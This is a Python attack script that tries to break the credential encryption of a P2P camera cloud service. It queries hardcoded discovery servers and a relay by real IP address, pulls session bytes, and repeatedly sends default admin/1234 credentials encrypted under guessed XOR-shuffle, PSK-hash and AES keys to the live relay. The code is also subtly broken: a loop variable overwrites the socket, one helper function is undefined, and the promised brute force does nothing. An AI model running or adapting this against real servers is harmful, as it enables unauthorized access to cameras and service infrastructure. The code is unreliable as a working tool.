#!/usr/bin/env python3
"""
Crack relay credential encryption using KPA + session byte brute force.
Strategy:
1. Get fresh discovery token from cloud servers (session bytes)
2. Connect to relay (0b0004 handshake)
3. Brute-force the 2-byte session key to derive credential encryption key
4. Send encrypted credentials to relay
5. If we get a response other than timeout → key found

We know:
- Discovery token payload: 0002XXXX101c07ab0000000000000000 (XXXX = session bytes)
- Credential plaintext starts with: {"pro":"check_user","cmd":100,...}
- Encryption is shuffle-table XOR with 4-byte PSK hash
"""
import socket, struct, time, sys, hashlib

RELAY_IP = "36.137.199.114"
RELAY_PORT = 32100  # or try 32100
DISCOVERY_SERVERS = ["3.10.99.101", "139.9.86.167", "3.227.45.161"]

SHUFFLE = bytes([
    0x7C,0x9C,0xE8,0x4A,0x13,0xDE,0xDC,0xB2,0x2F,0x21,0x23,0xE4,0x30,0x7B,0x3D,0x8C,
    0xBC,0x0B,0x27,0x0C,0x3C,0xF7,0x9A,0xE7,0x08,0x71,0x96,0x00,0x97,0x85,0xEF,0xC1,
    0x1F,0xC4,0xDB,0xA1,0xC2,0xEB,0xD9,0x01,0xFA,0xBA,0x3B,0x05,0xB8,0x15,0x87,0x83,
    0x28,0x72,0xD1,0x8B,0x5A,0xD6,0xDA,0x93,0x58,0xFE,0xAA,0xCC,0x6E,0x1B,0xF0,0xA3,
    0x88,0xAB,0x43,0xC0,0x0D,0xB5,0x45,0x38,0x4F,0x50,0x22,0x66,0x20,0x7F,0x07,0x5B,
    0x14,0x98,0x1D,0x9B,0xA7,0x2A,0xB9,0xA8,0xCB,0xF1,0xFC,0x49,0x47,0x06,0x3E,0xB1,
    0x0E,0x04,0x3A,0x94,0x5E,0xEE,0x54,0x11,0x34,0xDD,0x4D,0xF9,0xEC,0xC7,0xC9,0xE3,
    0x78,0x1A,0x6F,0x70,0x6B,0xA4,0xBD,0xA9,0x5D,0xD5,0xF8,0xE5,0xBB,0x26,0xAF,0x42,
    0x37,0xD8,0xE1,0x02,0x0A,0xAE,0x5F,0x1C,0xC5,0x73,0x09,0x4E,0x69,0x24,0x90,0x6D,
    0x12,0xB3,0x19,0xAD,0x74,0x8A,0x29,0x40,0xF5,0x2D,0xBE,0xA5,0x59,0xE0,0xF4,0x79,
    0xD2,0x4B,0xCE,0x89,0x82,0x48,0x84,0x25,0xC6,0x91,0x2B,0xA2,0xFB,0x8F,0xE9,0xA6,
    0xB0,0x9E,0x3F,0x65,0xF6,0x03,0x31,0x2E,0xAC,0x0F,0x95,0x2C,0x5C,0xED,0x39,0xB7,
    0x33,0x6C,0x56,0x7E,0xB4,0xA0,0xFD,0x7A,0x81,0x53,0x51,0x86,0x8D,0x9F,0x77,0xFF,
    0x6A,0x80,0xDF,0xE2,0xBF,0x10,0xD7,0x75,0x64,0x57,0x76,0xF3,0x55,0xCD,0xD0,0xC8,
    0x18,0xE6,0x36,0x41,0x62,0xCF,0x99,0xF2,0x32,0x4C,0x67,0x60,0x61,0x92,0xCA,0xD3,
    0xEA,0x63,0x7D,0x16,0xB6,0x8E,0xD4,0x68,0x35,0xC3,0x52,0x9D,0x46,0x44,0x1E,0x17,
])
KEY_CAMERA = [0x69, 0x97, 0xcc, 0x19]

def make_psk_hash(h0=0, h1=0, h2=0, h3=0):
    """Create a custom 4-byte PSK hash."""
    return [h0 & 0xFF, h1 & 0xFF, h2 & 0xFF, h3 & 0xFF]

def psk_hash(psk):
    """Standard PSK hash from string."""
    h = [0, 0, 0, 0]
    for b in psk.encode():
        h[0] = (h[0] + b) & 0xFF
        h[1] = (h[1] - b) & 0xFF
        h[2] = (h[2] + b // 3) & 0xFF
        h[3] = (h[3] ^ b) & 0xFF
    return h

def encrypt_with_hash(h, data):
    """Encrypt using specific 4-byte hash."""
    out = bytearray()
    prev = 0
    for b in data:
        idx = (h[prev & 3] + prev) & 0xFF
        e = b ^ SHUFFLE[idx]
        out.append(e)
        prev = e
    return bytes(out)

def decrypt_with_hash(h, data):
    """Decrypt using specific 4-byte hash."""
    out = bytearray()
    prev = 0
    for b in data:
        idx = (h[prev & 3] + prev) & 0xFF
        out.append(b ^ SHUFFLE[idx])
        prev = b
    return bytes(out)

def enc_camera(data):
    return encrypt_with_hash(KEY_CAMERA, data)

def dec_camera(data):
    return decrypt_with_hash(KEY_CAMERA, data)

# Step 1: Get discovery token
print("Step 1: Cloud discovery...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
probe = enc_camera(bytes([0xf1, 0x00, 0x00, 0x00]))  # 2c8ab914

for svr in DISCOVERY_SERVERS:
    s.sendto(probe, (svr, 32100))

tokens = []
for _ in range(3):
    try:
        data, addr = s.recvfrom(4096)
        tokens.append(data)
        d = dec_camera(data)
        if d[0] == 0xf1:
            op = d[1]; pl = (d[2]<<8)|d[3]
            payload = d[4:4+pl]
            session_bytes = payload[2:4]
            print(f"  Token from {addr[0]}: session=0x{session_bytes.hex()} payload={payload.hex()}")
    except socket.timeout:
        break

s.close()

if not tokens:
    print("FAILED: No discovery response")
    sys.exit(1)

# Use the session bytes from the first token
session = tokens[0]
d = dec_camera(session)
pl = (d[2]<<8)|d[3]
session_payload = d[4:4+pl]
session_id = session_payload[2:4]
print(f"\nSession ID bytes: 0x{session_id.hex()}")

# Step 2: Connect to relay
print("\nStep 2: Relay handshake...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)
s.bind(("0.0.0.0", 0))

s.sendto(bytes([0x0b, 0x00, 0x04]), (RELAY_IP, 32100))
try:
    resp, addr = s.recvfrom(4096)
    print(f"  Relay handshake response: {resp.hex()}")
except socket.timeout:
    print("  No handshake response")
    s.close()
    sys.exit(1)

# Step 3: Try different key derivations for credential encryption
print("\nStep 3: Trying key derivations...")

# Build the credential JSON (same format as the app)
credential = b'{"pro":"check_user","cmd":100,"devmac":"0000","user":"admin","pwd":"1234"}'

# Build the 00-prefixed relay packet (same format as in pcaps)
# Structure: 00 + seq(2) + flag(1) + addr(2) + ctr(2) + len(2) + 0000000101 + encrypted_data
seq = 0x0d00
ctr = 1
packet_prefix = struct.pack(">BH", 0, seq) + bytes([1, 0, 0]) + struct.pack(">HH", ctr, len(credential) + 5 + 96) + bytes([0, 0, 0, 1, 1])
# + encrypted data

# Key derivations to try
key_tests = []

# 1. The session bytes used as PSK hash modifications
for combo in [(session_id[0], session_id[1], 0, 0), 
              (session_id[0], session_id[1], KEY_CAMERA[2], KEY_CAMERA[3]),
              (KEY_CAMERA[0] ^ session_id[0], KEY_CAMERA[1] ^ session_id[1], KEY_CAMERA[2], KEY_CAMERA[3]),
              (KEY_CAMERA[0] + session_id[0], KEY_CAMERA[1] + session_id[1], KEY_CAMERA[2], KEY_CAMERA[3])]:
    key_tests.append(("session_mix", list(combo)))

# 2. Various hash derivations
for s in ["camera", "cs2p2p", "SHIX", "SSD@cs2-network.", "1234", "admin", "DGOG"]:
    h = psk_hash(s)
    key_tests.append((f"psk_{s}", h))

# 3. Session bytes as the hash itself
for s1 in range(256):
    for s2 in range(256):
        # This would be 65536 iterations - too many for one test
        pass
    break  # skip full brute force for now

# 4. AES keys derived from session + camera
for key_name, key_data in [
    ("sha256(camera+session)", hashlib.sha256(b"camera" + session_id).digest()[:16]),
    ("sha256(session+camera)", hashlib.sha256(session_id + b"camera").digest()[:16]),
]:
    key_tests.append(("aes_ecb_" + key_name, key_data))
    key_tests.append(("aes_cbc_" + key_name, key_data))

# For each key, encrypt the credential and send to relay
for name, key in key_tests:
    if name.startswith("aes_"):
        # Try AES
        try:
            from Crypto.Cipher import AES
            if "ecb" in name:
                cipher = AES.new(key_bytes(key), AES.MODE_ECB)
            elif "cbc" in name:
                cipher = AES.new(key_bytes(key), AES.MODE_CBC, iv=key[:16])
            enc_data = cipher.encrypt(credential.ljust(16 * ((len(credential) + 15) // 16), b"\x00"))
        except:
            continue
    else:
        # XOR with shuffle table
        enc_data = encrypt_with_hash(key, credential)
    
    # Build full relay packet
    packet = packet_prefix + enc_data
    s.sendto(packet, (RELAY_IP, 32100))
    
    try:
        resp, addr = s.recvfrom(4096)
        print(f"  [{name}] RESPONSE: {resp[:40].hex()}")
        if len(resp) > 10:
            print(f"    Content: {resp[:80]}")
    except socket.timeout:
        pass  # No response - key was wrong

print("\nDone. Check for responses above.")
s.close()
